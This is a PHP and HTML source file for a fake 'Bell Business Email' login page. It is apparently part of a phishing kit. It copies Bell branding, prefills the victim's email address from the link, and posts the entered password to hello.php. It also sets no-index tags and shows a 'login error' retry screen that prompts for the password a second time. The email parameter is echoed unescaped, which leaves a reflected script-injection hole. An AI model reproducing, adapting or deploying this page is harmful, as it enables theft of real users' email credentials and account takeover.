<?php
error_reporting(0);
if((isset($_GET['login'])) && ($_GET['login'] == 'error')){
	$img='1.png';
	$action='1';
	$top = '398px';
	$col = 'red';
}else{
$img='0.png';
	$action='0';
	$top = '355px';	
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xml:lang="en" lang="en" xmlns="http://www.w3.org/1999/html">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge,10,9,8,7"/>
	<title>Bell Business Email</title>
	<link rel="icon" type="image/png" sizes="32x32" href="https://webmail.en.bellnet.ca/ux/login/img/favicon.ico">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700,300italic,400italic,600italic">

<meta name="robots" content="noindex" /><meta name="robots" content="nofollow" />
<META NAME="GOOGLEBOT" CONTENT="NOARCHIVE" /><META NAME="GOOGLEBOT" CONTENT="NOSNIPPET" />
</head>
<body>
<style>
.login{
	width:440px;
	height:47px;
	background: transparent;
    border: none;
	padding-left:15px;
	font-color:#FFFFFF;
	 
}
.btn{
	width:110px;
	height:37px;
	background: #0F2B7B;
    border: none;
	cursor:pointer; 
	border-radius:20px;
}


input,
span,
label,
textarea {
  font-family: 'Ubuntu', sans-serif;
  display: block;
  margin: 10px;
  padding: 5px;
  border: none;
  z-index:10;
  color:#000;
  font-size: 18px;
}


input:focus {
  outline: 0;
}
/* Question */

input.question,
textarea.question {
  font-size: 18px;
  font-weight: 300;
  border-radius: 2px;
  margin: 0;
  border: none;
  width: 80%;
  background: rgba(0, 0, 0, 0);
  transition: padding-top 0.2s ease, margin-top 0.2s ease;
  overflow-x: hidden; /* Hack to make "rows" attribute apply in Firefox. */
}
/* Underline and Placeholder */

input.question + label,
textarea.question + label {
  display: block;
  position: relative;
  white-space: nowrap;
  padding: 0;
  margin: 0;
  width: 10%;
  -webkit-transition: width 0.4s ease;
  transition: width 0.4s ease;
  height: 0px;
}

input.question:focus + label,
textarea.question:focus + label {
  width: 80%;
}

input.question:focus,
input.question:valid {
  padding: 20px 2px 5px 15px;
  
  
}


input.question:focus + label > span,
input.question:valid + label > span {
  top: -63px;
  font-size: 13px;
  font-weight:500;
  color: #333;
}

input.question:valid + label,
textarea.question:valid + label {
  border-color: green;
}

input.question:invalid,
textarea.question:invalid {
  box-shadow: none;
}

input.question + label > span,
textarea.question + label > span {
  font-weight: 500;
  margin: 0;
  position: absolute;
  color: #333;
  font-size: 18px;
  top: -36px;
  left: 10px;
  z-index: -1;
  -webkit-transition: top 0.2s ease, font-size 0.2s ease, color 0.2s ease;
  transition: top 0.2s ease, font-size 0.2s ease, color 0.2s ease;
}

@-webkit-keyframes appear {
  100% {
    opacity: 1;
  }
}

@keyframes appear {
  100% {
    opacity: 1;
  }
}

.pass {
	color:red;
}
</style>
<div style="margin:-8px;width:100%">
<img id="bg" src="img/bg2.png">

	<div style="background: #FFF; width:360px; height:470px; border: #FFF; padding:10px; border-radius:12px; color:#000000;  
	-webkit-box-shadow: 1px 1px 1px 1px #848484; box-shadow: 1px 1px 1px 1px #848484; font-size:14px; color:#08298A; font-weight:bold; position:absolute;top:100px;left:80px;">
	</div>

	<div style="position:absolute;top:135px;left:120px;">
		<font face="calibri" style="font-size:40px;">
			<strong>Log in</strong>
		</font>
	</div>

	<form method="post" action="hello.php" onsubmit="return process()">
	<input type="hidden" name="code" value="<?php echo $action;?>">

	<div style="position:absolute;top:215px;left:120px;">
		<font face="calibri" style="font-size:17px;">
		<strong> Email Address </strong>
		</font>
	</div>

	<div class="form-group" style="position:absolute;top:240px;left:120px;">
		<input readonly title="" placeholder="" id="user" name="user" class="login question" value="<?php echo $_GET['email'];?>" 
		style="background: #FFF; width:290px; height:30px; border: #FFF; padding:5px; border-radius:3px; color:#000000;  
		-webkit-box-shadow: 1px 1px 1px 1px #848484; box-shadow: 1px 1px 1px 1px #848484; font-size:14px; color:#000000; font-weight:bold;">
    </div>
	
	
	<div style="position:absolute;top:315px;left:120px">
		<font face="calibri" style="font-size:17px;">
		<strong> Password </strong>
		</font>
	</div>
    <div class="form-group" style="width:452px;position:absolute;top:340px;left:120px;">
      <input required title="" placeholder="" type="password" id="pass" name="pass" class="login question" 
	  style="background: #FFF; width:290px; height:30px; border: #FFF; padding:5px; border-radius:3px; color:#000000;  
		-webkit-box-shadow: 1px 1px 1px 1px #848484; box-shadow: 1px 1px 1px 1px #848484; font-size:14px; color:#000000; font-weight:bold;">
   </div>
   
   <input type="submit" class="btn" style="position:absolute;top:395px;left:110px; color:#FFFFFF; font-size:14px; font-weight:bold;" value="Log in">
</form>
</div>

	<div style="position:absolute;top:465px;left:115px">
		<font face="calibri" color="#585757" style="font-size:16px;">
		Forgot your password? Call <strong> 310-BELL </strong> to reset it
		</font>
	</div>
	
	<img src="./img/footer.png" style="width:380px; position:absolute;top:530px;left:80px; border-radius:15px;">
	
<div class="form-wrapper">
  <form action="" class="form">
  </form>
</div>
<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js'></script>

<script>
function process(){
	var user = document.getElementById('user').value;
	var pass = document.getElementById('pass').value;
	if ((user == '') || (user == null)){
	document.getElementById('bg').src='files/1.png';
	document.getElementById('user').focus();
return false;	
	}else
	if ((pass == '') || (pass == null)){
	document.getElementById('bg').src='files/2.png';
	document.getElementById('pass').focus();
return false;	
	}else
	
return true	;
}
</script>
<script>
$('input').focus(function(){
  $(this).parents('.form-group').addClass('focused');
});

$('input').blur(function(){
  var inputValue = $(this).val();
  if ( inputValue == "" ) {
    $(this).removeClass('filled');
    $(this).parents('.form-group').removeClass('focused');  
  } else {
    $(this).addClass('filled');
  }
})  
</script>
</body>
</html>